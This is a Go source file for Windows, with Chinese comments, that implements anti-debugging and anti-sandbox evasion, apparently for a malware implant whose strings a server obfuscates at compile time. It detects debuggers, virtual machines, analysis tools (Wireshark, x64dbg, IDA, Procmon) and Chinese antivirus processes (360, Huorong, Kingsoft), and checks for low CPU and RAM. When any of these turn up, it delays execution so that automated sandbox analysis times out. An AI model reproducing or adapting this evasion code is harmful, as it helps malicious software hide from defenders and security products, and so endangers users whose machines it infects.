//go:build windows

package main

import (
	"runtime"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 反沙箱/反调试（仅 Windows）：
// 命中调试器、沙箱/虚拟化进程特征或典型低配资源环境时，延迟执行一段
// 时间后再继续，干扰自动化分析与沙箱超时判定。
// 策略为"延迟"而非"退出"，避免误伤正常主机。
// 敏感 API 名与进程特征字符串由服务端编译期混淆为 xd("hex")，二进制无明文。

func evasionInit() {
	delay := time.Duration(0)

	// 1. 反调试：IsDebuggerPresent
	isDbg := resolveAPI("kernel32.dll", "IsDebuggerPresent")
	if err := isDbg.Find(); err == nil {
		if r, _, _ := isDbg.Call(); r != 0 {
			delay += 3 * time.Second
		}
	}

	// 2. 沙箱/虚拟化/分析工具进程特征（含常见国内杀软主动防御进程）
	suspects := []string{
		"vboxservice", "vboxtray", "vbox", "vmwaretray", "vmwareuser",
		"vmacthlp", "vmsrvc", "vmtoolsd", "sandboxie", "sbiesvc",
		"sbiectrl", "procmon", "procmon64", "tcpview", "autoruns",
		"wireshark", "fiddler", "charles", "burpsuite", "ollydbg",
		"x64dbg", "windbg", "ida64", "ida",
		// 主动防御/安全软件特征进程（命中即延迟，干扰行为沙箱判定）
		"qihoo", "qhsafetray", "qhactivedefense", "zhudongfangyu",
		"360tray", "360safe", "360sd", "360se", "360zip", "huorong",
		"hipsdaemon", "sysdiag", "wsctrl", "kxescore", "kxetray",
	}
	if snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0); err == nil {
		defer windows.CloseHandle(snap)
		var pe windows.ProcessEntry32
		pe.Size = uint32(unsafe.Sizeof(pe))
		for e := windows.Process32First(snap, &pe); e == nil; e = windows.Process32Next(snap, &pe) {
			name := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
			for _, s := range suspects {

				if strings.Contains(name, s) {
					delay += 5 * time.Second
					goto resourceCheck
				}
			}
		}
	}

resourceCheck:
	// 3. 资源特征：CPU < 2 核或物理内存 < 2GB（典型沙箱低配配置）
	if runtime.NumCPU() < 2 {
		delay += 3 * time.Second
	}
	gms := resolveAPI("kernel32.dll", "GlobalMemoryStatusEx")
	if err := gms.Find(); err == nil {
		m := &memoryStatusEx{Length: uint32(unsafe.Sizeof(memoryStatusEx{}))}
		if r, _, _ := gms.Call(uintptr(unsafe.Pointer(m))); r != 0 && m.TotalPhys > 0 && m.TotalPhys < 2*1024*1024*1024 {
			delay += 3 * time.Second
		}
	}

	// 4. 随机运行延迟：0~3s，打乱自动化/行为沙箱对"启动即连/即行为"的判定节奏。
	//    仅当检测到上述分析/安全特征时才叠加随机延迟；正常主机不额外延时。
	//    保持轻量：启动随机延迟由配置 startup_delay_min/max 主导，这里只加少量扰动。
	if delay > 0 {
		delay += time.Duration(time.Now().UnixNano()%3000) * time.Millisecond
		time.Sleep(delay)
	}
}

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}
